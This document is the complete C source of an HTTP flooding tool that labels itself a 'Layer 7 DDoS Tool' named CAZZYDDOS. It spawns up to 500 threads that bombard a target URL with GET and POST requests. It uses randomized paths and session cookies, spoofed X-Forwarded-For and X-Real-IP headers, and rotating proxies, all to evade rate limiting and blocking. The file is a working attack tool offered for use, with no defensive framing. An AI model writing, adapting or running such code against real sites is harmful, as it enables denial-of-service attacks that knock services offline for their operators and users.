#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <stdbool.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <curl/curl.h>

#define MAX_WORKERS 500
#define MAX_URL_LEN 2048
#define MAX_PROXIES 10000

#define COLOR_RESET "\033[0m"
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_WHITE "\033[37m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_CYAN "\033[36m"
#define COLOR_BLUE "\033[34m"

typedef struct {
    char **proxies;
    int count;
    int index;
    pthread_mutex_t mutex;
} ProxyList;

typedef struct {
    long long requests;
    long long responses;
    long long errors;
    long long total_latency;
    pthread_mutex_t mutex;
} AtomicStats;

typedef struct {
    char target_url[512];
    char methods[10][10];
    int method_count;
    int duration_sec;
    int concurrency;
    int burst_size;
    bool random_path;
    bool random_ip;
    bool random_cookie;
    bool burst_mode;
    char proxy_file[256];
} AttackConfig;

ProxyList proxy_list = {0};
AtomicStats stats = {0, 0, 0, 0, PTHREAD_MUTEX_INITIALIZER};
volatile bool running = true;
pthread_t worker_threads[MAX_WORKERS];
pthread_t stats_thread;
time_t start_time;
unsigned int rand_state;

const char *COOKIE_NAMES[] = {
    "sessionid", "userid", "token", "auth", "visitor_id", 
    "client_id", "device_id", "tracking_id", "analytics_id",
    "PHPSESSID", "JSESSIONID", "ASPSESSIONID", "CFID", "CFTOKEN",
    "_ga", "_gid", "_fbp", "_twitter_sess", "_csrf",
    "XSRF-TOKEN", "laravel_session", "django_session", "rack.session",
    "sid", "uid", "cid", "uuid", "guid"
};

void init_random() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    rand_state = tv.tv_sec ^ tv.tv_usec ^ getpid();
    srand(rand_state);
}

int rand_int(int min, int max) {
    return min + (rand() % (max - min + 1));
}

char* random_string(int n) {
    const char letters[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    char *str = malloc(n + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i] = letters[rand() % (sizeof(letters) - 1)];
    }
    str[n] = '\0';
    return str;
}

char* random_hex_string(int n) {
    const char hex[] = "0123456789abcdef";
    char *str = malloc(n + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i] = hex[rand() % 16];
    }
    str[n] = '\0';
    return str;
}

char* random_ip() {
    char *ip = malloc(20);
    if (!ip) return NULL;
    int a = rand_int(1, 255);
    int b = rand_int(0, 255);
    int c = rand_int(0, 255);
    int d = rand_int(1, 254);
    snprintf(ip, 20, "%d.%d.%d.%d", a, b, c, d);
    return ip;
}

char* generate_random_cookie() {
    char *cookie = malloc(512);
    if (!cookie) return NULL;
    
    int num_cookies = rand_int(1, 4);
    char temp[512] = {0};
    
    for (int i = 0; i < num_cookies; i++) {
        const char *name = COOKIE_NAMES[rand_int(0, sizeof(COOKIE_NAMES)/sizeof(COOKIE_NAMES[0]) - 1)];
        
        char *value;
        int value_type = rand_int(0, 3);
        if (value_type == 0) {
            value = random_string(rand_int(8, 24));
        } else if (value_type == 1) {
            value = random_hex_string(rand_int(16, 32));
        } else {
            value = malloc(32);
            snprintf(value, 32, "%d_%s", rand_int(100000, 999999), random_string(8));
        }
        
        if (i > 0) strcat(temp, "; ");
        sprintf(temp + strlen(temp), "%s=%s", name, value);
        
        free(value);
    }
    
    strcpy(cookie, temp);
    return cookie;
}

char* generate_random_path() {
    const char *paths[] = {
        "/", "/index.html", "/api/v1/test", "/admin", "/login",
        "/dashboard", "/status", "/health", "/metrics", "/stats",
        "/products", "/cart", "/checkout", "/profile", "/settings",
        "/search", "/category", "/blog", "/news", "/contact"
    };
    int path_count = sizeof(paths) / sizeof(paths[0]);
    
    char *result = malloc(MAX_URL_LEN);
    if (!result) return NULL;
    
    const char *base_path = paths[rand_int(0, path_count - 1)];
    strcpy(result, base_path);
    
    if (rand_int(1, 100) <= 50) {
        char *rand_str = random_string(8);
        char query[256];
        snprintf(query, sizeof(query), "?r=%s&_=%ld&v=%d", rand_str, time(NULL), rand_int(1, 99999));
        strcat(result, query);
        free(rand_str);
    }
    
    return result;
}

void load_proxies(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        printf(COLOR_RED "[-] Failed to load proxies file: %s\n" COLOR_RESET, filename);
        return;
    }
    
    pthread_mutex_lock(&proxy_list.mutex);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
        free(proxy_list.proxies);
    }
    
    proxy_list.proxies = malloc(sizeof(char*) * MAX_PROXIES);
    proxy_list.count = 0;
    
    char line[256];
    while (fgets(line, sizeof(line), file) && proxy_list.count < MAX_PROXIES) {
        line[strcspn(line, "\r\n")] = 0;
        if (strlen(line) > 0 && strchr(line, ':')) {
            proxy_list.proxies[proxy_list.count] = strdup(line);
            proxy_list.count++;
        }
    }
    
    fclose(file);
    proxy_list.index = 0;
    pthread_mutex_unlock(&proxy_list.mutex);
    
    printf(COLOR_GREEN "[+] Loaded %d proxies\n" COLOR_RESET, proxy_list.count);
}

char* get_random_proxy() {
    pthread_mutex_lock(&proxy_list.mutex);
    if (proxy_list.count == 0) {
        pthread_mutex_unlock(&proxy_list.mutex);
        return NULL;
    }
    char *proxy = strdup(proxy_list.proxies[rand_int(0, proxy_list.count - 1)]);
    pthread_mutex_unlock(&proxy_list.mutex);
    return proxy;
}

void send_request(AttackConfig *cfg, const char *proxy) {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char full_url[MAX_URL_LEN];
    char *path = cfg->random_path ? generate_random_path() : strdup("/");
    
    snprintf(full_url, sizeof(full_url), "%s%s", cfg->target_url, path);
    
    struct curl_slist *headers = NULL;
    const char *method = cfg->methods[rand_int(0, cfg->method_count - 1)];
    char *ua = random_string(rand_int(20, 30));
    char *ip = cfg->random_ip ? random_ip() : NULL;
    char *cookie = cfg->random_cookie ? generate_random_cookie() : NULL;
    
    char header_buffer[1024];
    snprintf(header_buffer, sizeof(header_buffer), "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/%s", ua);
    headers = curl_slist_append(headers, header_buffer);
    
    if (ip) {
        snprintf(header_buffer, sizeof(header_buffer), "X-Forwarded-For: %s", ip);
        headers = curl_slist_append(headers, header_buffer);
        snprintf(header_buffer, sizeof(header_buffer), "X-Real-IP: %s", ip);
        headers = curl_slist_append(headers, header_buffer);
    }
    
    if (cookie) {
        snprintf(header_buffer, sizeof(header_buffer), "Cookie: %s", cookie);
        headers = curl_slist_append(headers, header_buffer);
    }
    
    headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
    headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
    headers = curl_slist_append(headers, "Connection: keep-alive");
    headers = curl_slist_append(headers, "Cache-Control: no-cache, no-store, must-revalidate");
    headers = curl_slist_append(headers, "Pragma: no-cache");
    headers = curl_slist_append(headers, "Sec-Fetch-Dest: document");
    headers = curl_slist_append(headers, "Sec-Fetch-Mode: navigate");
    headers = curl_slist_append(headers, "Sec-Fetch-Site: none");
    headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
    
    curl_easy_setopt(curl, CURLOPT_URL, full_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(curl, CURLOPT_FORBID_REUSE, 1L);
    
    if (proxy) {
        curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
        curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    }
    
    if (strcmp(method, "POST") == 0) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
    } else if (strcmp(method, "HEAD") == 0) {
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    } else {
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    }
    
    struct timeval start, end;
    gettimeofday(&start, NULL);
    
    CURLcode res = curl_easy_perform(curl);
    
    gettimeofday(&end, NULL);
    long latency = (end.tv_sec - start.tv_sec) * 1000 + (end.tv_usec - start.tv_usec) / 1000;
    
    pthread_mutex_lock(&stats.mutex);
    stats.requests++;
    if (res == CURLE_OK) {
        stats.responses++;
        stats.total_latency += latency;
    } else {
        stats.errors++;
    }
    pthread_mutex_unlock(&stats.mutex);
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(path);
    free(ua);
    if (ip) free(ip);
    if (cookie) free(cookie);
}

void* worker_function(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    
    while (running) {
        char *proxy = (cfg->proxy_file[0] && proxy_list.count > 0) ? get_random_proxy() : NULL;
        
        int burst_count = cfg->burst_mode ? (1 + rand_int(0, cfg->burst_size)) : 1;
        
        for (int i = 0; i < burst_count && running; i++) {
            send_request(cfg, proxy);
            
            if (i < burst_count - 1) {
                usleep(rand_int(5, 20) * 1000);
            }
        }
        
        if (proxy) free(proxy);
        usleep(rand_int(10, 100) * 1000);
    }
    
    return NULL;
}

void* stats_printer_function(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    
    while (running) {
        sleep(1);
        
        time_t now = time(NULL);
        double elapsed = difftime(now, start_time);
        
        long long requests, responses, errors, total_lat;
        
        pthread_mutex_lock(&stats.mutex);
        requests = stats.requests;
        responses = stats.responses;
        errors = stats.errors;
        total_lat = stats.total_latency;
        pthread_mutex_unlock(&stats.mutex);
        
        double rps = elapsed > 0 ? requests / elapsed : 0;
        double avg_latency = responses > 0 ? (double)total_lat / responses : 0;
        double success_rate = requests > 0 ? (double)responses / requests * 100 : 0;
        
        printf("\r\033[K");
        printf(COLOR_CYAN "[%.0fs/%ds] " COLOR_RESET, elapsed, cfg->duration_sec);
        printf(COLOR_GREEN "Req: %lld " COLOR_RESET, requests);
        printf(COLOR_YELLOW "Res: %lld " COLOR_RESET, responses);
        printf(COLOR_RED "Err: %lld " COLOR_RESET, errors);
        printf(COLOR_WHITE "RPS: %.0f " COLOR_RESET, rps);
        printf(COLOR_BLUE "Lat: %.0fms " COLOR_RESET, avg_latency);
        printf(COLOR_MAGENTA "Rate: %.1f%%" COLOR_RESET, success_rate);
        fflush(stdout);
    }
    
    return NULL;
}

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf(COLOR_YELLOW "\n[!] Shutting down...\n" COLOR_RESET);
        running = false;
    }
}

void print_banner() {
    printf(COLOR_RED);
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║     ██████╗ █████╗ ███████╗███████╗██╗   ██╗██████╗ ██████╗  ║\n");
    printf("║    ██╔════╝██╔══██╗╚══███╔╝██╔════╝╚██╗ ██╔╝██╔══██╗██╔══██╗ ║\n");
    printf("║    ██║     ███████║  ███╔╝ ███████╗ ╚████╔╝ ██║  ██║██║  ██║ ║\n");
    printf("║    ██║     ██╔══██║ ███╔╝  ╚════██║  ╚██╔╝  ██║  ██║██║  ██║ ║\n");
    printf("║    ╚██████╗██║  ██║███████╗███████║   ██║   ██████╔╝██████╔╝ ║\n");
    printf("║     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═════╝  ║\n");
    printf("║                         C A Z Z Y D D O S                      ║\n");
    printf("║              Layer 7 DDoS Tool - Random Cookie Support         ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET);
}

int main(int argc, char *argv[]) {
    AttackConfig cfg = {0};
    
    cfg.duration_sec = 30;
    cfg.concurrency = 100;
    cfg.burst_size = 10;
    cfg.random_path = true;
    cfg.random_ip = true;
    cfg.random_cookie = true;
    cfg.burst_mode = true;
    cfg.method_count = 2;
    strcpy(cfg.methods[0], "GET");
    strcpy(cfg.methods[1], "POST");
    cfg.proxy_file[0] = '\0';
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-url") == 0 && i+1 < argc) {
            strncpy(cfg.target_url, argv[++i], 511);
            cfg.target_url[511] = '\0';
        } else if (strcmp(argv[i], "-duration") == 0 && i+1 < argc) {
            cfg.duration_sec = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-concurrency") == 0 && i+1 < argc) {
            cfg.concurrency = atoi(argv[++i]);
            if (cfg.concurrency > MAX_WORKERS) cfg.concurrency = MAX_WORKERS;
        } else if (strcmp(argv[i], "-methods") == 0 && i+1 < argc) {
            char *token = strtok(argv[++i], ",");
            cfg.method_count = 0;
            while (token && cfg.method_count < 10) {
                strncpy(cfg.methods[cfg.method_count++], token, 9);
                token = strtok(NULL, ",");
            }
        } else if (strcmp(argv[i], "-no-random-cookie") == 0) {
            cfg.random_cookie = false;
        } else if (strcmp(argv[i], "-proxy-file") == 0 && i+1 < argc) {
            strncpy(cfg.proxy_file, argv[++i], 255);
            cfg.proxy_file[255] = '\0';
        } else if (strcmp(argv[i], "-help") == 0) {
            print_banner();
            printf("\nUsage: %s -url <target> [options]\n\n", argv[0]);
            printf("Options:\n");
            printf("  -url <url>           Target URL (required)\n");
            printf("  -duration <sec>      Duration in seconds (default: 30)\n");
            printf("  -concurrency <n>     Concurrent workers (default: 100, max: %d)\n", MAX_WORKERS);
            printf("  -methods <list>      HTTP methods (default: GET,POST)\n");
            printf("  -proxy-file <file>   Proxy list file\n");
            printf("  -no-random-cookie    Disable random cookie generation\n");
            printf("  -help                Show this help\n\n");
            printf("Cookie Randomization:\n");
            printf("  - Random cookie names from 30+ common session cookies\n");
            printf("  - Random values (alphanumeric, hex, or mixed)\n");
            printf("  - 1-4 cookies per request\n");
            printf("  - New random cookies for EVERY request\n\n");
            printf("Example:\n");
            printf("  %s -url https://example.com -duration 60 -concurrency 500\n", argv[0]);
            return 0;
        }
    }
    
    if (strlen(cfg.target_url) == 0) {
        print_banner();
        printf(COLOR_RED "\n[-] Error: -url is required\n" COLOR_RESET);
        return 1;
    }
    
    char temp[1024];
    if (!strstr(cfg.target_url, "://")) {
        snprintf(temp, sizeof(temp), "https://%s", cfg.target_url);
        strncpy(cfg.target_url, temp, 511);
        cfg.target_url[511] = '\0';
    }
    
    init_random();
    curl_global_init(CURL_GLOBAL_ALL);
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (cfg.proxy_file[0]) {
        load_proxies(cfg.proxy_file);
    }
    
    print_banner();
    printf(COLOR_CYAN "\n[+] Target: %s\n" COLOR_RESET, cfg.target_url);
    printf(COLOR_CYAN "[+] Duration: %d seconds\n" COLOR_RESET, cfg.duration_sec);
    printf(COLOR_CYAN "[+] Concurrency: %d\n" COLOR_RESET, cfg.concurrency);
    printf(COLOR_CYAN "[+] Methods: ");
    for (int i = 0; i < cfg.method_count; i++) {
        printf("%s ", cfg.methods[i]);
    }
    printf("\n" COLOR_RESET);
    printf(COLOR_CYAN "[+] Random Path: %s\n" COLOR_RESET, cfg.random_path ? "Enabled" : "Disabled");
    printf(COLOR_CYAN "[+] Random IP: %s\n" COLOR_RESET, cfg.random_ip ? "Enabled" : "Disabled");
    printf(COLOR_CYAN "[+] Random Cookie: %s\n" COLOR_RESET, cfg.random_cookie ? "Enabled" : "Disabled");
    if (cfg.proxy_file[0]) {
        printf(COLOR_CYAN "[+] Proxies: %s\n" COLOR_RESET, cfg.proxy_file);
    }
    
    printf(COLOR_YELLOW "\n[!] Starting attack with random cookies... Press Ctrl+C to stop\n\n" COLOR_RESET);
    
    start_time = time(NULL);
    running = true;
    
    pthread_create(&stats_thread, NULL, stats_printer_function, &cfg);
    
    AttackConfig *configs = malloc(sizeof(AttackConfig) * cfg.concurrency);
    if (!configs) {
        printf(COLOR_RED "[-] Memory allocation failed\n" COLOR_RESET);
        return 1;
    }
    
    for (int i = 0; i < cfg.concurrency; i++) {
        memcpy(&configs[i], &cfg, sizeof(AttackConfig));
        if (pthread_create(&worker_threads[i], NULL, worker_function, &configs[i]) != 0) {
            printf(COLOR_RED "[-] Failed to create thread %d\n" COLOR_RESET, i);
        }
    }
    
    sleep(cfg.duration_sec);
    running = false;
    
    for (int i = 0; i < cfg.concurrency; i++) {
        pthread_join(worker_threads[i], NULL);
    }
    pthread_join(stats_thread, NULL);
    
    long long requests, responses, errors, total_lat;
    
    pthread_mutex_lock(&stats.mutex);
    requests = stats.requests;
    responses = stats.responses;
    errors = stats.errors;
    total_lat = stats.total_latency;
    pthread_mutex_unlock(&stats.mutex);
    
    double avg_rps = (double)requests / cfg.duration_sec;
    double avg_latency = responses > 0 ? (double)total_lat / responses : 0;
    
    printf("\n\n" COLOR_MAGENTA "========== FINAL STATISTICS ==========\n" COLOR_RESET);
    printf(COLOR_CYAN "Duration: %d seconds\n" COLOR_RESET, cfg.duration_sec);
    printf(COLOR_GREEN "Total Requests: %lld\n" COLOR_RESET, requests);
    printf(COLOR_YELLOW "Responses: %lld\n" COLOR_RESET, responses);
    printf(COLOR_RED "Errors: %lld\n" COLOR_RESET, errors);
    printf(COLOR_WHITE "Average RPS: %.2f\n" COLOR_RESET, avg_rps);
    printf(COLOR_WHITE "Average Latency: %.2fms\n" COLOR_RESET, avg_latency);
    printf(COLOR_MAGENTA "=========================================\n" COLOR_RESET);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
        free(proxy_list.proxies);
    }
    
    free(configs);
    curl_global_cleanup();
    
    return 0;
}
